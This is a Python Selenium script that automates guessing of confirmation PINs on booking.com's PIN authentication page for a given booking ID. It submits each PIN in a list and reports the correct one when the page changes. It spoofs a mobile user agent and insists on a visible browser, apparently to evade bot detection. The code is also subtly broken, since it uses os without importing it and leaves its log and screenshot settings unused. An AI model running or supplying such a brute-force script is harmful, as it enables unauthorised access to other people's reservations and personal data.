from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver import ChromeOptions as Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

url = "https://secure.booking.com/help/confirmation_pin_auth"
booking_id = "1234567890"  # Replace with your actual booking ID
SCREEN_DIR = "screenshots"  # Directory to save screenshots
os.makedirs(SCREEN_DIR, exist_ok=True)
LOG_FILE = "pin_test_results.log"   # Log file to save results
pins = ["123456", "234567", "345678"]  # Replace with your actual PINs  

chrome_options = Options()
chrome_options.add_argument("--window-size=390,844")
chrome_options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36")
# Do not use headless. Always normal Chrome.

driver = webdriver.Chrome(options=chrome_options)
wait = WebDriverWait(driver, 30)

for pin in pins:
    print(f"Trying PIN: {pin}")
    driver.get(url)
    try:
        # Wait for form
        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[name=\"confirmation_number\"]')))
    except:
        print("Form did not appear. Skipping to next PIN.")
        continue

    # Fill form
    try:
        cnf = driver.find_element(By.CSS_SELECTOR, 'input[name=\"confirmation_number\"]')
        cnf.clear()
        cnf.send_keys(booking_id)
        pinf = driver.find_element(By.CSS_SELECTOR, 'input[name=\"pin\"]')
        pinf.clear()
        pinf.send_keys(pin)
        btn = driver.find_element(By.CSS_SELECTOR, 'button[type=\"submit\"]')
        btn.click()
    except Exception as e:
        print(f"Form fill/submit failed: {e}")
        continue

    # Wait max 10s for either success (url change) or error banner
    try:
        WebDriverWait(driver, 10).until(
            lambda d: d.current_url != url or d.find_elements(By.CSS_SELECTOR, '.bui-alert__text')
        )
    except:
        print("No feedback received after submit. Skipping to next PIN.")
        continue

    if driver.current_url != url:
        print(f"SUCCESS! Correct PIN is: {pin}")
        break
    elif driver.find_elements(By.CSS_SELECTOR, '.bui-alert__text'):
        print(f"PIN {pin} is incorrect (error banner shown).")
        continue
    else:
        print("No definite result, moving to next PIN.")

print("Test complete.")
driver.quit()
